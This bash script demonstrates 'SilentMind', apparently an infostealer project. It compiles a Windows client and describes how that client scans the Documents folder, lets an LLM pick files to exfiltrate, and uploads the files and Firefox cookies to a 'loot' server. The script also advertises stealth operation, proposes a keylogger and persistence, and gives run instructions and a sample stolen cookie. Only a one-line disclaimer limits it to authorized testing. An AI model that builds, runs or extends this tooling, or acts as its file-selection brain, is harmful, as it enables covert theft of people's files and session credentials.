#!/bin/bash

# SilentMind Demonstration Script
# This script demonstrates the complete workflow of SilentMind

echo "🔥 SilentMind Demonstration Script"
echo "=================================="
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Function to print colored output
print_step() {
    echo -e "${BLUE}[STEP $1]${NC} $2"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_info() {
    echo -e "${CYAN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if we're in the right directory
if [ ! -f "app.py" ] || [ ! -f "client/main.c" ]; then
    print_error "Please run this script from the SilentMind root directory"
    exit 1
fi

print_step "1" "Setting up demonstration environment..."

# Create demo files
print_info "Creating demo files in Documents folder..."
mkdir -p ~/Documents/SilentMind_Demo
echo "This is a demo password file" > ~/Documents/SilentMind_Demo/passwords.txt
echo "Sensitive configuration data" > ~/Documents/SilentMind_Demo/config.conf
echo "Regular document" > ~/Documents/SilentMind_Demo/readme.txt
print_success "Demo files created"

# Check if Python dependencies are installed
print_step "2" "Checking Python dependencies..."
if ! python3 -c "import flask, requests, openai, colorama" 2>/dev/null; then
    print_warning "Installing Python dependencies..."
    pip3 install -r requirements.txt
fi
print_success "Dependencies ready"

# Check if .env file exists
print_step "3" "Checking configuration..."
if [ ! -f ".env" ]; then
    print_warning "Creating .env file from template..."
    cp .env.example .env
    print_info "Please edit .env file with your API keys before running the server"
fi

# Compile the Windows client
print_step "4" "Compiling Windows client..."
if [ ! -f "silentmind.exe" ]; then
    print_info "Compiling silentmind.exe..."
    ./compile_windows.sh
    if [ $? -eq 0 ]; then
        print_success "Client compiled successfully"
    else
        print_error "Compilation failed"
        exit 1
    fi
else
    print_success "Client already compiled"
fi

# Show the project structure
print_step "5" "Project structure overview..."
echo ""
print_info "SilentMind Project Structure:"
echo "├── client/                    # Windows client source code"
echo "│   ├── main.c                # Main client application"
echo "│   ├── encrypt.c/.h          # XOR encryption functions"
echo "│   ├── exfil_http.c          # HTTP exfiltration functions"
echo "│   └── firefox_cookies.c/.h  # Firefox cookie extraction"
echo "├── server/                   # Python server"
echo "│   ├── llm.py               # LLM integration"
echo "│   └── routes/               # API endpoints"
echo "├── loot/                    # Exfiltrated data storage"
echo "├── sqlite3.c/.h            # SQLite library"
echo "├── compile_windows.sh      # Cross-compilation script"
echo "└── app.py                  # Main server application"
echo ""

# Show the workflow
print_step "6" "Application workflow demonstration..."
echo ""
print_info "SilentMind Workflow:"
echo "1. 🔍 Client scans Documents folder for files"
echo "2. 📊 Client sends file list to server"
echo "3. 🤖 LLM analyzes files and decides what to exfiltrate"
echo "4. 📁 Client encrypts and uploads selected files"
echo "5. 🍪 Client extracts Firefox cookies"
echo "6. 🔒 Client encrypts and uploads cookies"
echo "7. 📥 Server receives and decrypts all data"
echo "8. 💾 Server saves both encrypted and decrypted versions"
echo ""

# Show API endpoints
print_step "7" "API endpoints overview..."
echo ""
print_info "Server API Endpoints:"
echo "POST /api/decision  - Get LLM decision on file exfiltration"
echo "POST /api/upload    - Upload encrypted files and cookies"
echo ""

# Show sample data
print_step "8" "Sample exfiltrated data..."
echo ""
print_info "Sample File Exfiltration:"
echo "Input: passwords.txt (14 bytes)"
echo "Output:"
echo "  - Encrypted: loot/20250909-092732__passwords.txt"
echo "  - Decrypted: loot/20250909-092732__passwords.recovered.txt"
echo ""

print_info "Sample Cookie Extraction:"
echo "=== FIREFOX COOKIES ==="
echo "Cookie #1:"
echo "  Domain: .cybertalents.com"
echo "  Name: XSRF-TOKEN"
echo "  Value: eyJpdiI6IjUvU05PNEJObzZoSWtIYmFUeHlnaHc9PSIs..."
echo "  Path: /"
echo "  Expires: 1757319429160"
echo "  Secure: 1"
echo "  HttpOnly: 0"
echo ""

# Show security features
print_step "9" "Security features..."
echo ""
print_info "Security Features:"
echo "🔒 XOR Encryption with 'SILENTMIND' key"
echo "🧹 Automatic temporary file cleanup"
echo "📋 Database copying to handle locked files"
echo "🛡️ Error handling without crashes"
echo "👻 Stealth operation (no visible windows)"
echo ""

# Show usage instructions
print_step "10" "Usage instructions..."
echo ""
print_info "To run SilentMind:"
echo ""
echo "1. Start the server (macOS):"
echo "   python3 app.py"
echo ""
echo "2. Run the client (Windows VM):"
echo "   silentmind.exe"
echo ""
echo "3. Check the loot directory for exfiltrated data:"
echo "   ls -la loot/"
echo ""

# Show next steps
print_step "11" "Next steps and enhancements..."
echo ""
print_info "Potential enhancements:"
echo "🌐 Add Chrome and Edge cookie support"
echo "📸 Add screenshot capture functionality"
echo "⌨️ Add keylogger capabilities"
echo "🔍 Add file search for specific types"
echo "📊 Add web dashboard for data visualization"
echo "🔄 Add persistence mechanisms"
echo ""

print_success "Demonstration complete!"
echo ""
print_info "SilentMind is ready for red team operations! 🔥"
echo ""
print_warning "Remember: Use only for authorized testing and educational purposes!"
